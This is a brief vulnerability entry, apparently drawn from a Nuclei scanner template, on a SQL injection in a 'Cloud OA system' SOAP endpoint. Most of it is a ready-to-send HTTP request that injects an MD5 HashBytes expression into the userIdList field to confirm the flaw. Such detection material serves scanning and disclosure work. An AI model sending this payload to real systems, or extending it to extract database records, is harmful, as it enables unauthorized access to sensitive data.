# Vulnerability: Cloud OA System - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`cloud-oa-system-sqli.yaml`)

## Description
cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /OA/PM/svc.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUsersInfo xmlns="http://tempuri.org/">
      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
    </GetUsersInfo>
  </soap:Body>
</soap:Envelope>
```

